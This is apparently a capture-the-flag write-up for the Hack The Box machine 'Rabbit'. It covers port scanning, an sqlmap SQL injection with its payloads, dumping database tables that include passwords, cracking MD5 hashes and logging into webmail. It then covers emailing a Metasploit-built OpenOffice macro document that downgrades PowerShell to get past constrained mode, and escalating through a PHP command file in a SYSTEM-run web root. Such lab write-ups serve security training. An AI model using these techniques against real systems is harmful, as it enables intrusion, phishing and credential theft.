# Rabbit
>Author : Xyan1d3
>Date : 20th June 2021
>IP : 10.10.10.71
>OS : Windows Active Directory
>Difficulty : Insane

# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Tue Jul 20 14:05:10 2021 as: nmap -sC -sV -v -oN nmap/rabbit 10.10.10.71
Nmap scan report for 10.10.10.71
Host is up (0.080s latency).
Not shown: 976 closed ports
PORT     STATE SERVICE           VERSION
25/tcp   open  smtp              Microsoft Exchange smtpd
| smtp-commands: Rabbit.htb.local Hello [10.10.14.23], SIZE, PIPELINING, DSN, ENHANCEDSTATUSCODES, STARTTLS, X-ANONYMOUSTLS, AUTH NTLM, X-EXPS GSSAPI NTLM, 8BITMIME, BINARYMIME, CHUNKING, XEXCH50, XRDST, XSHADOW, 
|_ This server supports the following commands: HELO EHLO STARTTLS RCPT DATA RSET MAIL QUIT HELP AUTH BDAT 
| smtp-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: RABBIT
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: Rabbit.htb.local
|_  Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=Rabbit
| Subject Alternative Name: DNS:Rabbit, DNS:Rabbit.htb.local
| Issuer: commonName=Rabbit
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2017-10-24T17:56:42
| Not valid after:  2022-10-24T17:56:42
| MD5:   8ec5 baee 0dd5 2ffa 102a 26b0 b23e 53c7
|_SHA-1: 9583 dc5b 45ea d4e4 f835 0c9d bf25 5a76 8572 8098
|_ssl-date: 2021-07-20T13:37:11+00:00; +5h00m09s from scanner time.
53/tcp   open  domain            Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
80/tcp   open  http              Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: 403 - Forbidden: Access is denied.
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2021-07-20 13:35:36Z)
135/tcp  open  msrpc             Microsoft Windows RPC
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
443/tcp  open  ssl/http          Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| ssl-cert: Subject: commonName=Rabbit
| Subject Alternative Name: DNS:Rabbit, DNS:Rabbit.htb.local
| Issuer: commonName=Rabbit
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2017-10-24T17:56:42
| Not valid after:  2022-10-24T17:56:42
| MD5:   8ec5 baee 0dd5 2ffa 102a 26b0 b23e 53c7
|_SHA-1: 9583 dc5b 45ea d4e4 f835 0c9d bf25 5a76 8572 8098
|_ssl-date: 2021-07-20T13:36:49+00:00; +5h00m10s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
587/tcp  open  smtp              Microsoft Exchange smtpd
| smtp-commands: Rabbit.htb.local Hello [10.10.14.23], SIZE 10485760, PIPELINING, DSN, ENHANCEDSTATUSCODES, STARTTLS, AUTH GSSAPI NTLM, 8BITMIME, BINARYMIME, CHUNKING, 
|_ This server supports the following commands: HELO EHLO STARTTLS RCPT DATA RSET MAIL QUIT HELP AUTH BDAT 
| smtp-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: RABBIT
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: Rabbit.htb.local
|_  Product_Version: 6.1.7601
|_ssl-date: 2021-07-20T13:37:11+00:00; +5h00m09s from scanner time.
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
808/tcp  open  ccproxy-http?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
3306/tcp open  mysql             MySQL 5.7.19
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.19
|   Thread ID: 4
|   Capabilities flags: 63487
|   Some Capabilities: Speaks41ProtocolNew, Support41Auth, ODBCClient, LongPassword, Speaks41ProtocolOld, FoundRows, SupportsTransactions, IgnoreSigpipes, ConnectWithDatabase, SupportsCompression, SupportsLoadDataLocal, InteractiveClient, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: P\x05k?\x1C[n-\x1BT\x0B\x13cF\x13I\x1D&0\x11
|_  Auth Plugin Name: mysql_native_password
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
6001/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6002/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6003/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6004/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6005/tcp open  msrpc             Microsoft Windows RPC
6006/tcp open  msrpc             Microsoft Windows RPC
6007/tcp open  msrpc             Microsoft Windows RPC
8080/tcp open  http              Apache httpd 2.4.27 ((Win64) PHP/5.6.31)
|_http-favicon: Unknown favicon MD5: 79E32EEA338FA735AD22D36104C4337A
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.27 (Win64) PHP/5.6.31
|_http-title: Example
Service Info: Hosts: Rabbit.htb.local, RABBIT; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2:sp1

Host script results:
|_clock-skew: mean: 5h00m09s, deviation: 0s, median: 5h00m08s
|_smb2-time: Protocol negotiation failed (SMB2)
```

## Gobuster on port 8080
```python
/index                (Status: 200) [Size: 10065]
/favicon              (Status: 200) [Size: 202575]
/%20                  (Status: 403) [Size: 299]
/joomla               (Status: 301) [Size: 328] [--> http://10.10.10.71:8080/joomla/]
/*checkout*           (Status: 403) [Size: 308]
/complain             (Status: 301) [Size: 330] [--> http://10.10.10.71:8080/complain/]
/phpmyadmin           (Status: 403) [Size: 308]
```

## Gobuster on port 443
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/rabbit]
└──╼ # cat gobuster443.out 
/public               (Status: 302) [Size: 146] [--> https://10.10.10.71/owa]
/exchange             (Status: 302) [Size: 146] [--> https://10.10.10.71/owa]
/ews                  (Status: 401) [Size: 0]
/exchweb              (Status: 302) [Size: 146] [--> https://10.10.10.71/owa]
```

## Web Enumeration
We see that `https://10.10.10.71/owa/` is hosting `Microsoft Office Exchange 2010`.
![[Pasted image 20210720181112.png]]

We visit the `http://10.10.10.71:8080/complain` and find out that we have `Complaint Management System`.
![[Pasted image 20210720181514.png]]

Which has an SQL Injection vulnerability : `https://www.exploit-db.com/exploits/42968`.

We could register an account and check for this `SQLi`.
We could now do the `sqli` with `sqlmap`.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/rabbit]
└──╼ # sqlmap -u "http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans" --cookie="PHPSESSID=758u3gl9jmd7u2od7m7lmhl605" --batch --dbms=mysql

[18:31:30] [INFO] testing connection to the target URL
[18:31:31] [INFO] testing if the target URL content is stable
[18:31:31] [INFO] target URL content is stable

*** SNIP ***

[18:31:54] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[18:31:54] [INFO] testing for SQL injection on GET parameter 'id'
[18:34:49] [INFO] GET parameter 'id' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable
[18:35:00] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1062 HTTP(s) requests:
---
Parameter: id (GET)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: mod=admin&view=repod&id=plans WHERE 2706=2706 AND GTID_SUBSET(CONCAT(0x7162627871,(SELECT (ELT(6289=6289,1))),0x71626b6b71),6289)-- kmdx

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: mod=admin&view=repod&id=plans WHERE 7668=7668 AND (SELECT 1719 FROM (SELECT(SLEEP(5)))GbHu)-- eLsI
---
[18:35:00] [INFO] the back-end DBMS is MySQL
web application technology: PHP 5.6.31, Apache 2.4.27
back-end DBMS: MySQL >= 5.6
[18:35:01] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 62 times
[18:35:01] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.71'
```

We dump the databases names.
```python
available databases [7]:
[*] complain
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] secret
[*] sys

Database: complain
Table: tbl_engineer
[3 entries]
+-----+----------------------+-----------------+---------+----------------------------------+------------+---------------------+
| eid | email                | ename           | epass   | address                          | e_mobile   | date_time           |
+-----+----------------------+-----------------+---------+----------------------------------+------------+---------------------+
| 4   | mubarak@gmail.com    | Mubarak Bahesti | mubarak | 290, asif nagar, pune            | 9856323568 | 2011-02-02 23:15:20 |
| 5   | ramiz@gmail.com      | Ramiz Khan      | ramiz   | 10, merta tower                  | 9854251425 | 2011-02-02 23:36:09 |
| 6   | amol.sarode@gmail.co | Amol sarode     | amol    | \t\t\t  12/c, camp, pune\t\t\t   | 2541258452 | 2011-02-02 23:36:51 |
+-----+----------------------+-----------------+---------+----------------------------------+------------+---------------------+

Database: complain
Table: tbl_customer
[5 entries]
+-----+----------------+------------+---------------------+------------------------------------------------------+------------+---------------------+
| cid | cname          | cpass      | email               | address                                              | c_mobile   | date_time           |
+-----+----------------+------------+---------------------+------------------------------------------------------+------------+---------------------+
| 1   | rizwan khatik  | riz123     | riz1.a@gmail.com    | \t\t\t  3, Hill side, Bhaguday Nagar, Kondwa\t\t\t   | 9089789876 | 2010-11-27 12:55:39 |
| 4   | Manmohan Singh | mansingh   | man.mohan@yo.com    | 10, raj bhavan                                       | 9652525252 | 2011-02-02 23:52:36 |
| 5   | Sardar         | sar1       | sardar.p@yahoo.com  | 11, ashoka heights, kondwa, pune                     | 9521425425 | 2011-02-03 07:45:47 |
| 7   | magisk         | magisk@123 | magisk@magisk.htb   | Earth                                                | 1234567890 | 2021-07-20 13:44:36 |
| 8   | xyan1d3        | xyan1d3    | xyan1d3@xyan1d3.htb | xyan1d3                                              | 1234567890 | 2021-07-20 13:58:59 |
+-----+----------------+------------+---------------------+------------------------------------------------------+------------+---------------------+

Database: complain
Table: tbl_plans
[2 entries]
+----+-----+-----+--------------------------+-----------+
| id | cid | amt | plans                    | plan_date |
+----+-----+-----+--------------------------+-----------+
| 3  | 5   | 150 | Basic Plan, Music Plan,  | 13        |
| 4  | 6   | 120 | Basic Plan,              | 05        |
+----+-----+-----+--------------------------+-----------+

Database: complain
Table: tbl_supplier
[1 entry]
+-----+------------------------+--------------+----------+-----------------------+------------+---------------------+
| sid | email                  | sname        | spass    | address               | s_mobile   | date_time           |
+-----+------------------------+--------------+----------+-----------------------+------------+---------------------+
| 1   | maryam.afifa@gmail.com | maryam afifa | marry123 | 290, shani peth, pune | 9987876765 | 2010-11-27 17:29:05 |
+-----+------------------------+--------------+----------+-----------------------+------------+---------------------+

Database: complain                                                                                                                                               [10/589]
Table: tbl_complains
[9 entries]
+-----+--------+---------+----------+----------------+-------------------------------------------------------------------------------------------------------------------
-----------+-----------+---------------+---------------------+-----------------------------------+---------------------+-------------------------------------------------
-------+
| cid | eng_id | cust_id | status   | eng_name       | comp_desc                    
           | comp_type | cust_name     | close_date          | comp_title                        | create_date         | eng_comment                                     
       |
+-----+--------+---------+----------+----------------+-------------------------------------------------------------------------------------------------------------------
-----------+-----------+---------------+---------------------+-----------------------------------+---------------------+-------------------------------------------------
-------+
| 2   | 1      | 2       | close    | Prashant Kumar | Hi.\r\n\r\nMy machine is making to much noice, will u plz assist.\r\n\r\nthanks                                   
           | hardware  | ayesha khan   | 0000-00-00 00:00:00 | my machine is making noice.       | 2010-11-27 18:59:12 | working on it.                                  
       |
| 3   | 2      | 2       | close    | Aijaz Aslam    | Hi.\r\n\r\nMS Office is not working. i think its a problem of virus.\r\nplease help.\r\n\r\nThanks                
           | software  | ayesha khan   | 0000-00-00 00:00:00 | MS Office is not working          | 2010-11-27 19:04:14 | poblem of virus. working on it.\r\nwill need som
e time |
| 4   | 5      | 1       | assigned | Ramiz Khan     | Hello.\r\n\r\nI am unable to connect to 10.88.29.098. their is a problem in LAN. Please do needful.\r\n\r\nRegards
\r\nRizwan | network   | rizwan khatik | 0000-00-00 00:00:00 | Unable to connect                 | 2010-11-27 19:30:10 | <blank>                                         
       |
| 6   | 1      | 1       | working  | Prashant Kumar | Hi. \r\nMy internate connection is very slow.\r\n                                                                 
           | network   | rizwan khatik | 0000-00-00 00:00:00 | Internet is very slow             | 2010-11-28 09:26:36 | Working on it                                   
       |
| 7   | 3      | 3       | close    | Atul Nigade    | hi,\r\nms office is not working fine. may be a problem of virus,\r\n\r\nplz assist.\r\n\r\nheena                  
           | software  | heena         | 0000-00-00 00:00:00 | MS Office is not working          | 2010-11-28 14:08:49 | complain is resloved                            
       |
| 8   | 3      | 1       | working  | Atul Nigade    | Hello.\r\n\r\nI have problem in my monitor\r\nplz assist\r\n\r\nrizwan                                            
           | hardware  | rizwan khatik | 0000-00-00 00:00:00 | My monitor is not getting display | 2010-12-07 21:49:38 | i am working on it                              
       |
| 9   | 0      | 6       | open     | <blank>        | hello,\r\n\r\nmy setup box is not working well. please assist.\r\n\r\nThanks                                      
           | software  | asif          | 0000-00-00 00:00:00 | My setup box is not working       | 2012-02-05 17:35:36 | <blank>                                         
       |
| 10  | 0      | 6       | open     | <blank>        | <blank>                      
           | hardware  | asif          | 0000-00-00 00:00:00 | <blank>                           | 2012-03-24 10:02:18 | <blank>                                         
       |
| 11  | 5      | 1       | assigned | Ramiz Khan     | Facing problem in installation of WLAN. Pls assist.                                                               
           | software  | rizwan khatik | 0000-00-00 00:00:00 | problem in installation           | 2013-11-29 09:48:32 | <blank>                                         
       |
+-----+--------+---------+----------+----------------+-------------------------------------------------------------------------------------------------------------------
-----------+-----------+---------------+---------------------+-----------------------------------+---------------------+-------------------------------------------------
-------+

Database: secret
Table: users
[10 entries]
+----------------------------------+----------+
| Password                         | Username |
+----------------------------------+----------+
| 13fa8abd10eed98d89fd6fc678afaf94 | Zephon   |
| 33903fbcc0b1046a09edfaa0a65e8f8c | Kain     |
| 33da7a40473c1637f1a2e142f4925194 | Dumah    |
| 370fc3559c9f0bff80543f2e1151c537 | Magnus   |
| 719da165a626b4cf23b626896c213b84 | Raziel   |
| a6f30815a43f38ec6de95b9a9d74da37 | Moebius  |
| b9c2538d92362e0e18e52d0ee9ca0c6f | Ariel    |
| d322dc36451587ea2994c84c9d9717a1 | Turel    |
| d459f76a5eeeed0eca8ab4476c144ac4 | Dimitri  |
| dea56e47f1c62c30b83b70eb281a6c39 | Malek    |
+----------------------------------+----------+
```

We find out that we have some `md5` hashes, Which we can crack using `crackstation`.
![[Pasted image 20210720184921.png]]

We login to `OWA` with username : `Kain` and password : `doradaybendita`.
![[Pasted image 20210720203752.png]]

We also find an intersting email which states that the whole infrasctructre is migrating to `openoffice`.
![[Pasted image 20210720203840.png]]

Which is particularly intersting as there is an `CVE` which executes file when an `odf` file is opened by an user.
![[Pasted image 20210720204000.png]]

We generate an `odf` file using `multi/misc/openoffice_document_macro` module of `metasploit` and send this as an email attachment to all the users.
![[Pasted image 20210720205232.png]]

We generate the payload but, The problem is mentioned in one of the mail that powershell is running with constrained mode. So, Our payload may not work.
So, We could change the `odt` file extension to a zip file and change the `module` to add `-version 2` to downgrade into `powershell 2` and bypass the constrained language.
![[Pasted image 20210720211411.png]]

We could now, rename it back to `.odt` and mail the file and wait for `RCE`.

After Waiting for a while we get a shell back as `Raziel`.
![[Pasted image 20210720211538.png]]

## Getting the user Flag
```python
C:\Users\Raziel\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEA8-5415

 Directory of C:\Users\Raziel\Desktop

02/11/2021  04:06 PM    <DIR>          .
02/11/2021  04:06 PM    <DIR>          ..
10/29/2017  10:07 AM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  25,138,065,408 bytes free

C:\Users\Raziel\Desktop>type user.txt
type user.txt
c6f45142bea818fe729cef32342aae9c
```

# Root Escalation
We run `winpeas.bat` and find out that we have that `httpd.exe` is running as `NT Authority/SYSTEM`.
![[Pasted image 20210720222337.png]]

We create a php file which `GET` and puts it inside the `system`.
We could put that file in `C:\wamp64\www`.
![[Pasted image 20210720233009.png]]

## Getting the root Flag
![[Pasted image 20210720233048.png]]

